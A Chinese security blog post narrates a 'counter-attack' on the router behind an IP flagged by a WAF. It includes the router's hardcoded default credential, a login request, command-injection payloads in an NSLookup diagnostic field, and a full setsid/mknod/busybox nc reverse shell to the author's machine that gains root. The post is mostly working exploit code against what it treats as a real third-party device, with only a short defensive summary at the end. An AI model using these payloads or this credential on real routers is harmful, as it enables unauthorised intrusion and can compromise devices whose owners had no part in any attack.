---
title: 从 WAF 告警到反控攻击者路由器：一次完整的溯源反制
date: 2026-06-01
categories: 文章/漏洞分析
tags:
  - 溯源反制
  - 命令注入
  - GPON
  - 路由器安全
  - WAF
---

## 前言

近日，网站 WAF 持续拦截到来自 IP `<攻击者IP>` 的恶意请求，经分析为典型的 Web 攻击行为。在对攻击流量溯源的过程中，发现该 IP 出口设备为一台暴露在公网的 GPON ONT 光猫路由器——管理界面直接开在 80 端口，且存在前端硬编码凭据和命令注入漏洞。

本文完整记录从 WAF 告警到反向拿下攻击者路由器 root 权限的全过程。

**攻击链：**

```
WAF 告警 → 端口发现 → 前端硬编码凭据 → 认证绕过 → NSLookup 命令注入 → 反弹 Shell
```

---

## 一、信息收集

### 1.1 端口扫描

```bash
nmap -Pn -sV -p 21,22,23,53,80,443,8080,8443 <攻击者IP>
```

仅 80 端口开放，运行 HTTP Web 管理界面。

<img src="/wp-content/uploads/2026/img-801533c4aaa7.png">

### 1.2 Web 界面探测

```bash
# 该路由器不支持 HTTP/1.1，需强制 HTTP/1.0 访问
curl -s --http0.9 'http://<攻击者IP>/' -o router_page.html
```

浏览器访问确认是 GPON ONT 路由器管理登录页面。

<img src="/wp-content/uploads/2026/img-60162980fbf5.png">

---

## 二、认证绕过 — 前端硬编码凭据

### 2.1 源码审计发现凭据

查看页面源码，在 `<script>` 标签中直接发现明文凭据：

```javascript
var veriCode = 'N5qKyT@S';   // 验证码明文
var UserUserName = 'user';    // 默认用户名
```

<img src="/wp-content/uploads/2026/img-bc973f6f3f81.png">

### 2.2 认证逻辑分析

继续审计 `login.js`，梳理出完整认证流程：

1. 用户名白名单：仅允许 `user` 或 `admin`
2. 密码处理：对输入密码**仅做 Base64 编码**即提交，无加密保护
3. 登录接口：`POST /login.cgi`
4. 提交参数：`username=<用户名>&wd=<Base64(密码)>`

**关键发现：** `veriCode` 的设计意图是让 `drawwdCanva()` 函数将其渲染到 Canvas 上作为图形验证码。但这个值**同时也是 `user` 账号的默认密码**——验证码即密码。验证码本应随机生成，但此处以明文变量写死在页面源码中，形同虚设。

<img src="/wp-content/uploads/2026/img-f29befdf8d15.png">

### 2.3 登录验证

```bash
# 将 veriCode 做 Base64 编码
WD=$(echo -n 'N5qKyT@S' | base64)
# WD = TjVxS3lUQFM=

curl -s --http0.9 -c /tmp/router_cookies.txt \
  -X POST 'http://<攻击者IP>/login.cgi' \
  -d "username=user&wd=${WD}"
```

`user` + Base64 编码后的 `veriCode`，**成功登录管理后台**。

<img src="/wp-content/uploads/2026/img-8a5920a48713.png">

> 以下请求均携带上述 Cookie，不再重复标注。

---

## 三、命令注入 — NSLookup 诊断接口

### 3.1 发现注入点

登录后台后审计页面源码，发现诊断功能：

- 接口：`POST /uajax/diagnostics_nslookup_json.htm`
- 功能：执行 NSLookup DNS 查询
- 参数：`HostName`（域名输入框，用户可自定义输入）

<img src="/wp-content/uploads/2026/img-d64fa81788f3.png">

### 3.2 正常请求验证

```bash
curl -s --http0.9 -b /tmp/router_cookies.txt \
  -X POST 'http://<攻击者IP>/uajax/diagnostics_nslookup_json.htm' \
  -d 'a=set&x=InternetGatewayDevice.NSLookupDiagnostics.&HostName=google.com&DiagnosticsState=Requested'
```

<img src="/wp-content/uploads/2026/img-994c5a1f669c.png">

返回正常的 nslookup 结果，接口可用。

### 3.3 延时注入确认

`HostName` 直接拼接系统命令，无任何过滤。用 `;` 截断并追加 `sleep 5`：

```bash
time curl -s --http0.9 -b /tmp/router_cookies.txt \
  -X POST 'http://<攻击者IP>/uajax/diagnostics_nslookup_json.htm' \
  -d 'a=set&x=InternetGatewayDevice.NSLookupDiagnostics.&HostName=g%3Bsleep+5&DiagnosticsState=Requested'
```

**响应耗时约 5 秒（正常即时返回）→ 命令注入确认。**

<img src="/wp-content/uploads/2026/img-c11a6a0cd175.png">

---

## 四、反弹 Shell

命令注入已确认，目标升级为交互式反弹 Shell。先摸清设备上有什么工具。

### 4.1 环境探测

```bash
# 攻击机监听
nc -lvnp 8852

# 注入：探测可用 shell
curl -s --http0.9 -b /tmp/router_cookies.txt \
  -X POST 'http://<攻击者IP>/uajax/diagnostics_nslookup_json.htm' \
  --data-urlencode 'a=set' \
  --data-urlencode 'x=InternetGatewayDevice.NSLookupDiagnostics.' \
  --data-urlencode 'HostName=g;ls /bin/*sh* /bin/busybox 2>&1 | /bin/busybox nc <攻击机IP> 8852 &' \
  --data-urlencode 'DiagnosticsState=Requested'
```

<img src="/wp-content/uploads/2026/img-ce923d04cb06.png">

设备上有 `/bin/sh`、`/bin/ash`、`/bin/bash` 和 `/bin/busybox`。

继续探测 BusyBox 编译了哪些命令：

```bash
nc -lvnp 8852

curl -s --http0.9 -b /tmp/router_cookies.txt \
  -X POST 'http://<攻击者IP>/uajax/diagnostics_nslookup_json.htm' \
  --data-urlencode 'a=set' \
  --data-urlencode 'x=InternetGatewayDevice.NSLookupDiagnostics.' \
  --data-urlencode 'HostName=g;busybox --list 2>&1 | /bin/busybox nc <攻击机IP> 8852 &' \
  --data-urlencode 'DiagnosticsState=Requested'
```

<img src="/wp-content/uploads/2026/img-7c9494015aeb.png">

关键命令可用性：

| 命令        | 状态       | 说明                               |
| :---------- | :--------- | :--------------------------------- |
| `nc`        | 有         | 不确定是否支持 `-e`                |
| `wget`      | 有         | 可下载外部文件                     |
| `mknod`     | 有         | 可创建命名管道                     |
| `setsid`    | 有         | 可脱离进程组                       |
| `mkfifo`    | **没有**   | 经典 mkfifo 反弹方式不可用         |
| `curl/python/perl/socat` | **没有** | —                        |

### 4.2 三次失败与根因

**尝试一：`nc -e /bin/sh`** — 攻击机未收到连接。该 BusyBox 编译时 nc 不支持 `-e` 参数。

<img src="/wp-content/uploads/2026/img-53166fb21076.png">

**尝试二：`mknod` 命名管道** — nc 收到连接，短暂出现 `#` 提示符后立即断开。

<img src="/wp-content/uploads/2026/img-15fab9147a4f.png">

**尝试三：双端口 nc 管道** — 同样立即断开。

三次失败现象一致：nc 能连上攻击机，但连接随即断开。**根因是进程组回收**——所有注入进程都是 web 服务（CGI handler）的子进程。HTTP 响应返回后，web 服务清理同一进程组下的所有子进程。`&` 后台运行只是不阻塞前台，进程仍属于同一进程组，无法逃脱清理。

### 4.3 最终方案：setsid + mknod

从 BusyBox 命令列表中找到关键工具 `setsid`——它创建新会话（session），新进程脱离原进程组，不受 web 服务清理影响。

结合 `mknod` 命名管道，构建最终 payload：

```bash
setsid /bin/sh -c "mknod /tmp/q p 2>/dev/null; /bin/busybox nc <攻击机IP> 8852 </tmp/q | /bin/sh > /tmp/q 2>&1" &
```

**拆解：**

| 部分 | 作用 |
| :--- | :--- |
| `setsid` | 创建新会话，脱离 CGI 进程组 |
| `mknod /tmp/q p` | 创建命名管道（`p` = pipe 类型） |
| `nc ... </tmp/q` | nc 连接攻击机，stdin 从管道读取 |
| `\| /bin/sh` | nc 收到的数据通过管道传给 sh 执行 |
| `> /tmp/q 2>&1` | sh 输出写回管道，nc 读取后发回攻击机 |

**数据流：**

```
攻击机命令 ──网络──> nc ──管道──> sh 执行
                                  ↓
攻击机收到 <──网络── nc <──管道── sh 输出
```

### 4.4 发送 Payload

```bash
# 攻击机监听
nc -lvnp 8852

curl -s --http0.9 -b /tmp/router_cookies.txt \
  -X POST 'http://<攻击者IP>/uajax/diagnostics_nslookup_json.htm' \
  --data-urlencode 'a=set' \
  --data-urlencode 'x=InternetGatewayDevice.NSLookupDiagnostics.' \
  --data-urlencode 'HostName=g;setsid /bin/sh -c "mknod /tmp/q p 2>/dev/null;/bin/busybox nc <攻击机IP> 8852 </tmp/q|/bin/sh>/tmp/q 2>&1" &' \
  --data-urlencode 'DiagnosticsState=Requested'
```

**成功获取 root 权限交互式 Shell。**

<img src="/wp-content/uploads/2026/img-015d19c0e515.png">

<img src="/wp-content/uploads/2026/img-bd18d15bb415.png">

---

## 五、总结

| 阶段 | 操作 | 结果 |
| :--- | :--- | :--- |
| 溯源起点 | WAF 拦截恶意请求 | 锁定攻击源 `<攻击者IP>` |
| 信息收集 | 端口扫描 + Web 探测 | GPON ONT 管理界面暴露在公网 |
| 认证绕过 | 审计前端源码 | 验证码即默认密码，直接登录 |
| 命令注入 | NSLookup `HostName` 参数 | `;sleep 5` 延时确认 |
| 反弹 Shell | `setsid` 脱离进程组 + `mknod` 命名管道 | root 权限 |

**该设备暴露的安全问题：**

1. **前端硬编码凭据** — 验证码和默认密码以明文写在 JavaScript 中
2. **密码仅 Base64 传输** — 无加密保护，网络嗅探即可截获
3. **诊断接口无输入过滤** — `HostName` 直接拼接系统命令
4. **管理界面暴露公网** — 路由器管理端口不应对外开放

**防御建议：**

- 修改路由器默认密码，关闭管理界面外网访问
- 及时更新设备固件
- WAF/防火墙封禁恶意 IP 段
- 对公网管理界面实施 IP 白名单

> 本文仅供安全研究与学习交流，严禁用于非法用途。
